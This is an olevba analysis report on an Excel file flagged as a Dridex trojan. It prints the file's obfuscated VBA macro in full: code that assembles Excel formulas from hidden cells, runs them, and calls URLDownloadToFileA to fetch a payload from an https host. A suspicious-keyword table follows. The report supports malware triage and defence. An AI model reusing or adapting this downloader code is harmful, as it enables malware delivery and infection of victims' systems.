olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Dridex.gen-3f4632f072dca5d71e765dcdb19f411d30a2609850ecd7234e550da2475cd925
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 And Win64 Then
    Private Declare PtrSafe Function most_prints_g Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr _
      ) As Long
#Else
    Private Declare Function most_prints_g Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long _
      ) As Long
#End If

Function fill_fields()
fill_fields = "Z"
End Function




Sub REVIEW_ALL()
RGB_print = Split(to_home_seven, pic_in_pic("H", 4))
Sheets(1).Cells(3, 1).Name = "Fill_" & "pages"
print_lay1 = low_picss(RGB_print(1))
For Ii = 0 To UBound(print_lay1) - LBound(print_lay1) + msoColorTypeRGB
On Error Resume Next
doc_for_pay (print_lay1(Ii))
Application.Run ("Fill_" & "pages")
If Ii = msoUnderlineDotDashHeavyLine Then eCHOexits = vv_nextt:
If Ii = msoUnderlineDotDotDashHeavyLine Then
border_print_1 = vv_nextt
most_prints_g 0, sub_rose(N_progress(Split(RGB_print(0), "$" & "A"))), eCHOexits & "\" & border_print_1, 0, 0
End If
Next
End Sub


Function N_progress(Rr As Variant) As String
Randomize: rt = xlArrangeStyleTiled
v = UBound(Rr) + rt
N_progress = Rr(Int((v) * Rnd))
End Function


Function pic_in_pic(u As String, t As Integer)
pic_in_pic = Replace(String(t, fill_fields), fill_fields, u)
End Function


Public Function sub_rose(tt As String)
sub_rose = "ht" & "t" & "p" & "s://" & tt
End Function






Function times_new_rom()
times_new_rom = "J1:J3"
End Function



Function low_picss(e As Variant) As Variant
low_picss = Split(e, pic_in_pic("+", 4))
End Function



Function vv_nextt()
vv_nextt = Sheets(vbNull).Cells(2, 10)
End Function

Function doc_for_pay(i As String)
Sheets(vbNull).Cells(3, 1).value = "=" & i
End Function




Function to_home_seven()
For i = 1 To 5022 Step 2
k1 = Cells(i, 1)
k2 = Cells(i + 1, 1)
ee = ee & Sheets(2).Cells(k1, k2)
Next
to_home_seven = ee
End Function







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

